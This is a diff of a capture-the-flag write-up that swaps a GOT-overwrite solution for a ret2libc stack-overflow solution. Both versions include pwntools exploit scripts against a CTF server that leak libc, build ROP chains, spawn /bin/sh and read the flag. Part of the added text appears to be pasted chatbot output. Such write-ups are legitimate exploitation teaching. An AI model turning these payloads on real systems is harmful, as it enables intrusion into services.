@@ -38,67 +38,67 @@ $ checksec KindAuthor
 
 ---
 
+Here’s the customized **Static Analysis (IDA pro)** section for your **KindAuthor** (ret2libc) task:
+
+---
+
 ## Static Analysis (IDA pro)
 
-### Key Functionality
+### Vulnerable Code
 
 ```c
-printf("Prediction module address (predict_outcome): %p\n", predict_outcome);
+ssize_t func() {
+    _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF
+    return read(0, buf, 0x80uLL);  // Buffer overflow
+}
 ```
 
 ![Alt text](img/4.png)
 
-- The program prints the address of `predict_outcome`, which leaks a code pointer and allows calculation of the **binary base address**.
+- The `func()` function reads **128 bytes** of input into a **32-byte buffer**, resulting in a classic **stack-based buffer overflow**.
+- This overflow allows an attacker to **overwrite the return address** and control the program’s execution flow.
+
+### Main Function
 
 ```c
-scanf("%lx", &v5);
-scanf("%lx", &v4);
-*v5 = v4;  // Arbitrary write
+int main(int argc, const char **argv, const char **envp) {
+    puts("Hello\nInput your data:");
+    func();
+    return 0;
+}
 ```
 
 ![Alt text](img/5.png)
 
-- Option 3 ("Neural Intervention") allows the user to write any 64-bit value to any memory address, creating an **arbitrary write primitive**.
+- The `main()` function simply calls `func()` after printing a message. There are no mitigations like canaries or input validation.
 
-```c
-if (v3 == 4) {
-    exit(0);
-}
-```
+### Goal
 
-![Alt text](img/6.png)
+- The binary is suited for a **ret2libc** attack, where the attacker can:
 
-- Choosing option 4 calls `exit()`. If the GOT entry of `exit()` is overwritten with a custom function like `unlock_secret_research_data()`, it will be executed.
+  - Leak a libc address (e.g., via `puts@plt`).
+  - Calculate the **libc base**.
+  - Use `system("/bin/sh")` to spawn a shell and get the flag.
 
-### Hidden Function
+---
 
-```c
-int unlock_secret_research_data() {
-    return system("/bin/sh");
-}
-```
-
-![Alt text](img/7.png)
-
-- This hidden function spawns a shell and is not reachable during normal execution. Triggering it requires **overwriting `exit@GOT`** to point to it.
+This concise analysis highlights the overflow vulnerability and sets the stage for a ret2libc attack.
 
 ---
 
 ## Exploit Strategy
 
-### Step 1: Leak the Binary Base Address
+### Step 1: Overflow the Buffer
 
-At startup, the program prints the address of the `predict_outcome` function.
-We use this leak to calculate the **base address** of the binary.
+We send more than 32 bytes of input to the `func()` function, overflowing the buffer and overwriting the **return address** on the stack.
 
-### Step 2: Overwrite `exit@GOT`
+### Step 2: Leak a libc Address
 
-Using the "Neural Intervention" option (option 3), we perform an **arbitrary write** to overwrite the **GOT entry for `exit()`** with the address of the hidden `unlock_secret_research_data()` function.
+We craft a ROP chain that calls `puts(puts@got)` to leak the actual address of `puts` at runtime. This allows us to calculate the **libc base address**.
 
-### Step 3: Trigger the Payload
+### Step 3: ret2libc to Spawn a Shell
 
-We select menu option 4 (Exit), which causes the program to call `exit()`.
-Because we overwrote its GOT entry, control is redirected to `unlock_secret_research_data()`, which executes `system("/bin/sh")`.
+Using the libc base, we construct another ROP chain that calls `system("/bin/sh")`, giving us a shell and access to the flag.
 
 ---
 
@@ -108,11 +108,12 @@ Because we overwrote its GOT entry, control is redirected to `unlock_secret_rese
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template NeuralNet --host ctf.mf.grsu.by --port 9076
+# $ pwn template KindAuthor --host ctf.mf.grsu.by --port 9075
 from pwn import *
+import time
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or 'NeuralNet')
+exe = context.binary = ELF(args.EXE or 'KindAuthor')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -120,7 +121,7 @@ exe = context.binary = ELF(args.EXE or 'NeuralNet')
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
 host = args.HOST or 'ctf.mf.grsu.by'
-port = int(args.PORT or 9076)
+port = int(args.PORT or 9075)
 
 # Use the specified remote libc version unless explicitly told to use the
 # local system version with the `LOCAL_LIBC` argument.
@@ -173,7 +174,7 @@ continue
 # RELRO:      Partial RELRO
 # Stack:      No canary found
 # NX:         NX enabled
-# PIE:        PIE enabled
+# PIE:        No PIE (0x400000)
 # RUNPATH:    b'./'
 # Stripped:   No
 
@@ -188,21 +189,51 @@ io = start()
 # flag = io.recv(...)
 # log.success(flag)
 
-io.recvuntil(b'Prediction module address (predict_outcome): ')
-exe.address = int(io.recvline().strip(),16) - exe.symbols['predict_outcome']
-log.success(f"exe.address : {hex(exe.address)}")
+# ——— Build ROP ———
+rop = ROP(exe)
+pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
 
-exit_got = exe.got['exit']
-ret2win = exe.symbols['unlock_secret_research_data']
-io.sendline(b'3')
-io.sendline(hex(exit_got).encode())
-io.sendline(hex(ret2win).encode())
-io.sendline(b'4')
-io.sendline(b'cat flag.txt')
-io.recvuntil(b"You've gained root access to the main dataset server.")
+offset = 40
+payload = flat(
+    b'A' * offset,
+    pop_rdi,
+    exe.got['puts'],     # argument to puts
+    exe.plt['puts'],     # call puts( puts@got )
+    exe.symbols['main']  # jump back to main/menu
+)
+io.sendline(payload)
 io.recvline()
+io.recvline()
+puts_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
+libc.address = puts_leak - libc.symbols['puts']
+log.success(f"libc.address : {hex(libc.address)}")
+
+rop = ROP(libc)
+
+system_addr = libc.symbols['system']
+binsh_addr   = next(libc.search(b"/bin/sh\x00"))
+pop_rdi     = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret      = rop.find_gadget(['ret'])[0]
+exit_addr = libc.symbols['exit']
+rop_chain = flat(
+    b'A' * offset,
+    ret,
+    pop_rdi,
+    binsh_addr,
+    system_addr,
+    exit_addr
+)
+
+io.recvuntil(b"Input your data:")
+io.recvline()
+io.sendline(rop_chain)
+time.sleep(1)
+io.sendline(b'cat flag.txt')
+
 flag = io.recvline().strip()
 log.success(f"FLAG : {flag.decode()}")
+
+
 
 ```
 
@@ -225,5 +256,5 @@ log.success(f"FLAG : {flag.decode()}")
 ## Flag
 
 ```
-grodno{p3R3D08UchIL_n3ir053t_prY4M0_v_G0T}
+grodno{bL491M1_N4M3R3n1Y4m1_VYm05ch3n4_d0R094_v_5h3lL}
 ```
